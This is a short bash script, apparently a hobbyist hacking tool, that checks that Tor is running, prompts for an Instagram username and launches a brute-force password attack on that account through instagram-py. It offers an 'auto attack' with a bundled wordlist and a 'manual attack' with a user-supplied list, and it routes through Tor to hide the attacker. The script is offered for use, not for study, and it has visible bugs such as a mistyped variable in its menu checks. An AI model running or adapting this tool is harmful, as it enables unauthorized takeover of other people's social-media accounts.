#!/usr/bin/bash
#Author cyberxaman
#Make a function to show the maue option...
#Trap the exit 
trap out SIGINT
trap out SIGTSTP
# Make a function To user exit
#Small banner to show 
banner(){
	clear
	echo -e "\e[36;1m"
	echo '	     	       ___
	              / •_)
	     _.----._/ /
	    /         /
	 __/ (  | (  |
	/__.-•|_|--|_|'


         }

out(){
	echo ""
	echo -e "\e[31;1m Exiting 🧐😃 "
	echo -e "\e[32;1m   __________________  

    MADE BY CyberXaman
   ------------------  "
	sleep 2
	exit 1
}
#Check if tor is running or not...
pgrep -x tor > /dev/null 2>&1
if [[ $? -eq 0 ]];then
	echo -e "\e[37;1m Tor is running.."
else
	echo -e "\e[37;1m Tor is not running ,"
	echo -e "\e[37;1m   Please open new session and type tor , after starting tor run again "
	exit 1
fi

#Ask the insta username..
echo -ne "\e[36;1m Enter the username: "
read inuser
echo " "
echo -e "\e[31;1m[01]\e[32;1m Auto attack"
echo -e "\e[31;1m[02]\e[32;1m Manual attack"
echo -e "\e[31;1m[03]\e[32;1m About Me"
echo -e "\e[31;1m[04]\e[32;1m Exit "
echo -ne ":: "
read a_optn
if [[ $a_aptn -eq "1" || $a_optn -eq "01" ]];then
	echo "Auto attck.."
	banner
	instagram-py -u $inuser -pl Autopass.txt
	
elif [[ $a_aptn -eq "2" || $a_optn -eq "02" ]];then
	echo -ne  "\e[35;1mPath to password  list: "
	read p_path
	banner
	instagram-py -u $inuser -pl $p_path
elif [[ $a_aptn -eq "3" || $a_optn -eq "03" ]];then
    banner
	echo -e "\e[36;1m \n Hii I am cyberxeal , please subscribe to my channel and follow me on Instagram"
	echo -e "\e[36;1m Youtube Channel : https://instagram.com/cyberxeal"
	echo -e "\e[36;1m Gaming channel : https://tinyurl.com/mvxrf9w7\n"
elif [[ $a_aptn -eq "4" || $a_optn -eq "04" ]];then
    out 
else 
	echo "Invalid option [ Bro tumse na ho payega 😂😂 phir se try karo ] "
fi
